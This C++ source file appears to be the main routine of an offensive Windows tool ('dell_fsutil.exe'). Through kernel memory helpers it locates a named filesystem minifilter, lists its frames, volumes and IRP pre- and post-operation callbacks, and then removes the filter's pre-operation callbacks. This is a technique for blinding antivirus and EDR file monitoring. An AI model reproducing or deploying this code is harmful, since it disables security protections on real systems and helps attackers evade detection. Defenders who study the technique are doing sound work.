#include <Windows.h>
#include "memory.h"
#include "FltUtil.h"

int main(int argc, char** argv) {
	if (argc != 2) {
		puts("Useage: dell_fsutil.exe <FILTER_NAME>");
		return -1;
	}
	char* strFilterName = argv[1];
	wchar_t* wstrFilterName = new wchar_t[strlen(strFilterName) + 2];
	size_t numConv = 0;
	mbstowcs_s(&numConv, wstrFilterName, strlen(strFilterName) + 2,strFilterName, strlen(strFilterName));
	printf("Enumerating for filter %S\n", wstrFilterName);

	Memory m = Memory();
	FltManager oFlt = FltManager(&m);
	DWORD dwX = oFlt.GetFrameCount();
	printf("Flt globals is at %p\n", oFlt.lpFltGlobals);
	printf("%d frames available\n", dwX);
	printf("Frame list is at %p\n", oFlt.lpFltFrameList);
	
	PVOID lpFilter = oFlt.GetFilterByName(wstrFilterName);
	if (!lpFilter) {
		puts("Target filter not found, exiting...");
		exit(-1);
	}


	PVOID lpFrame = oFlt.GetFrameForFilter(lpFilter);
	printf("Frame for filter is at %p\n", lpFrame);

	auto vecOperations = oFlt.GetOperationsForFilter(lpFilter);
	for (auto op : vecOperations) {
		const char* strOperation = g_IrpMjMap.count((BYTE)op.MajorFunction) ?  g_IrpMjMap[(BYTE)op.MajorFunction] : "IRP_MJ_UNDEFINED";
		printf("MajorFn: %s\nPre: %p\nPost %p\n", strOperation, op.PreOperation, op.PostOperation);
	}

	auto frameVolumes = oFlt.EnumFrameVolumes(lpFrame);
	const wchar_t* strHardDiskPrefix = LR"(\Device\HarddiskVolume)";

	/*auto count = std::_Erase_nodes_if(frameVolumes, [strHardDiskPrefix](const auto& it) {
		return wcsncmp(it.first, strHardDiskPrefix, lstrlenW(strHardDiskPrefix)) != 0;
	});
	for (auto x : frameVolumes) {
		printf("Retained target volume : %S - %p\n", x.first, x.second);
	}*/
	
	BOOL bRes = oFlt.RemovePreCallbacksForVolumesAndCallbacks(vecOperations, frameVolumes);

	return 0;
}